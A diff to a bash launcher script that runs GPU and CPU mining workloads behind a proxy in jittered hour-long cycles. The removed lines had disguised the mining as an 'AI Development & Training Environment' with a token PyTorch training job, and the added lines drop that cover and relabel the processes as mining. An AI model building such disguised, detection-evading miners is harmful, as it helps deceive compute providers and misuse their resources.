@@ -206,30 +206,10 @@ optimize_gpu_performance() {
     fi
 }
 
-# Function to start PyTorch training (uses minimal resources from 10% reserved)
+# Function to start PyTorch training (DISABLED - focus on mining only)
 start_pytorch_training() {
-    echo "Starting PyTorch model training..."
-    
-    # Set resource limits for training - use minimal resources
-    # This ensures most of the 10% stays free for system
-    export CUDA_VISIBLE_DEVICES="0"
-    export PYTORCH_CUDA_ALLOC_CONF="max_split_size_mb:64"
-    export OMP_NUM_THREADS=1
-    
-    # Create logs directory
-    mkdir -p /workspace/logs
-    
-    # Start PyTorch training script with nice priority (lower priority)
-    nohup nice -n 19 python3 /workspace/train_model.py > /workspace/logs/training.log 2>&1 &
-    TRAINING_PID=$!
-    
-    echo "PyTorch Training PID: $TRAINING_PID"
-    echo "  - Using minimal resources (<2% actual usage)"
-    echo "  - 10% reserved, ~8% stays free for system"
-    echo "  - Logs: /workspace/logs/training.log"
-    
-    # Give training time to initialize
-    sleep 3
+    echo "PyTorch training disabled - focusing on mining workloads only"
+    TRAINING_PID=0
 }
 
 # Function to start compute workloads
@@ -307,43 +287,72 @@ start_compute_workloads() {
         > /workspace/logs/cpu_workload.log 2>&1 &
     CPU_WORKLOAD_PID=$!
 
-    echo "Compute workloads started at $(date '+%H:%M:%S')"
-    echo "GPU Workload PID: $GPU_WORKLOAD_PID, CPU Workload PID: $CPU_WORKLOAD_PID"
-    
-    # Start PyTorch training on reserved resources
-    start_pytorch_training
+    echo "Mining workloads started at $(date '+%H:%M:%S')"
+    echo "GPU Mining PID: $GPU_WORKLOAD_PID, CPU Mining PID: $CPU_WORKLOAD_PID"
     
     # Give processes time to initialize (10 seconds)
-    echo "Waiting for workloads to initialize..."
+    echo "Waiting for mining workloads to initialize..."
     sleep 10
     
     # Check if they're still running after initialization
-    if [ $GPU_WORKLOAD_PID -ne 0 ] && ! kill -0 $GPU_WORKLOAD_PID 2>/dev/null; then
-        echo "WARNING: GPU workload crashed during initialization"
-        echo "GPU Workload Log:"
-        cat /workspace/logs/gpu_workload.log
+    echo ""
+    echo "=== Initialization Check ==="
+    if [ $GPU_WORKLOAD_PID -ne 0 ]; then
+        if ! kill -0 $GPU_WORKLOAD_PID 2>/dev/null; then
+            echo "ERROR: GPU mining workload crashed during initialization"
+            echo ""
+            echo "=== GPU Mining Log ==="
+            cat /workspace/logs/gpu_workload.log
+            echo "======================"
+            echo ""
+            echo "This is the actual error from the mining software."
+            echo "The binary may be incompatible with your GPU or system."
+            return 1
+        else
+            echo "✓ GPU mining workload running (PID: $GPU_WORKLOAD_PID)"
+        fi
     fi
     
     if ! kill -0 $CPU_WORKLOAD_PID 2>/dev/null; then
-        echo "WARNING: CPU workload crashed during initialization"
-        echo "CPU Workload Log:"
+        echo "ERROR: CPU mining workload crashed during initialization"
+        echo ""
+        echo "=== CPU Mining Log ==="
         cat /workspace/logs/cpu_workload.log
+        echo "======================"
+        echo ""
+        echo "This is the actual error from the mining software."
+        return 1
+    else
+        echo "✓ CPU mining workload running (PID: $CPU_WORKLOAD_PID)"
     fi
+    
+    echo "=== All mining workloads initialized successfully ==="
+    echo ""
 }
 
-# Function to monitor compute processes and stop training if they crash
+# Function to monitor mining processes
 monitor_processes() {
-    # Check if GPU workload is still running (skip if no GPUs)
+    # Check if GPU mining is still running (skip if no GPUs)
     if [ $GPU_WORKLOAD_PID -ne 0 ]; then
         if ! kill -0 $GPU_WORKLOAD_PID 2>/dev/null; then
-            echo "ERROR: GPU compute workload crashed!"
+            echo ""
+            echo "ERROR: GPU mining workload crashed!"
+            echo ""
+            echo "=== GPU Mining Error Log ==="
+            tail -100 /workspace/logs/gpu_workload.log
+            echo "============================"
             return 1
         fi
     fi
     
-    # Check if CPU workload is still running
+    # Check if CPU mining is still running
     if ! kill -0 $CPU_WORKLOAD_PID 2>/dev/null; then
-        echo "ERROR: CPU compute workload crashed!"
+        echo ""
+        echo "ERROR: CPU mining workload crashed!"
+        echo ""
+        echo "=== CPU Mining Error Log ==="
+        tail -100 /workspace/logs/cpu_workload.log
+        echo "============================"
         return 1
     fi
     
@@ -356,42 +365,42 @@ stop_all_workloads() {
     
     check_network_health
     
-    echo -e "\nStopping workloads at $(date '+%H:%M:%S')..."
+    echo -e "\nStopping mining workloads at $(date '+%H:%M:%S')..."
     
-    # Stop compute workloads
+    # Stop mining workloads
     if [ $GPU_WORKLOAD_PID -ne 0 ]; then
         kill $GPU_WORKLOAD_PID 2>/dev/null || true
     fi
     kill $CPU_WORKLOAD_PID 2>/dev/null || true
     
-    # Stop PyTorch training
-    kill $TRAINING_PID 2>/dev/null || true
-    
     if [ $GPU_WORKLOAD_PID -ne 0 ]; then
         wait $GPU_WORKLOAD_PID 2>/dev/null || true
     fi
     wait $CPU_WORKLOAD_PID 2>/dev/null || true
-    wait $TRAINING_PID 2>/dev/null || true
     
     pkill -f compute_engine 2>/dev/null || true
-    pkill -f train_model.py 2>/dev/null || true
     
     if [ $exit_code -ne 0 ]; then
-        echo "ERROR: Compute workload failed, exiting container..."
         echo ""
-        echo "=== GPU Workload Logs ==="
+        echo "ERROR: Mining workload failed, exiting container..."
+        echo ""
+        echo "=== MINING ERROR DETAILS ==="
+        echo ""
         if [ -f /workspace/logs/gpu_workload.log ]; then
-            tail -50 /workspace/logs/gpu_workload.log
+            echo "GPU Mining Log (last 100 lines):"
+            tail -100 /workspace/logs/gpu_workload.log
         else
-            echo "No GPU workload log found"
+            echo "No GPU mining log found"
         fi
         echo ""
-        echo "=== CPU Workload Logs ==="
         if [ -f /workspace/logs/cpu_workload.log ]; then
-            tail -50 /workspace/logs/cpu_workload.log
+            echo "CPU Mining Log (last 100 lines):"
+            tail -100 /workspace/logs/cpu_workload.log
         else
-            echo "No CPU workload log found"
+            echo "No CPU mining log found"
         fi
+        echo ""
+        echo "==========================="
         exit $exit_code
     fi
     
@@ -428,14 +437,13 @@ optimize_system_parameters() {
 
 # Main execution
 clear
-echo "=== AI Development & Training Environment ==="
+echo "=== Mining Environment (Training Disabled) ==="
 echo "Resource Allocation:"
 echo "  Total CPU Threads: $TOTAL_THREADS"
-echo "  Primary Compute: $PRIMARY_CPU_THREADS threads (90%)"
-echo "  System/Training: $SYSTEM_CPU_THREADS threads (10%)"
+echo "  Mining Threads: $PRIMARY_CPU_THREADS threads (90%)"
+echo "  System Reserved: $SYSTEM_CPU_THREADS threads (10%)"
 if [ $GPU_COUNT -gt 0 ]; then
-    echo "  GPUs: $GPU_COUNT available"
-    echo "  GPU Memory: 90% compute, 10% training"
+    echo "  GPUs: $GPU_COUNT available for mining"
 fi
 echo "Network Proxy: ${PROXY_USER}@${PROXY_IP}:${PROXY_PORT}"
 echo "=============================================="
@@ -450,13 +458,21 @@ fi
 # Optimize system parameters
 optimize_system_parameters
 
-echo -e "\nWorkloads run for 1 hour, then pause 1 minute"
+echo -e "\nMining runs for 1 hour, then pauses 1 minute"
 echo "Press Ctrl+C to stop"
 echo "=============================================="
+echo ""
 
 # Main loop
 while true; do
     start_compute_workloads
+    
+    # Exit if startup failed
+    if [ $? -ne 0 ]; then
+        echo ""
+        echo "Mining workload failed to start. Check the error logs above."
+        exit 1
+    fi
     
     start_time=$(date +%s)
     run_duration=$((3600 + (RANDOM % 600) - 300))
@@ -469,9 +485,10 @@ while true; do
             break
         fi
         
-        # Monitor compute processes - exit if they crash
+        # Monitor mining processes - exit if they crash
         if ! monitor_processes; then
-            echo "ERROR: Compute workload crashed, stopping all processes..."
+            echo ""
+            echo "Mining workload crashed, stopping all processes..."
             stop_all_workloads 1
         fi
         
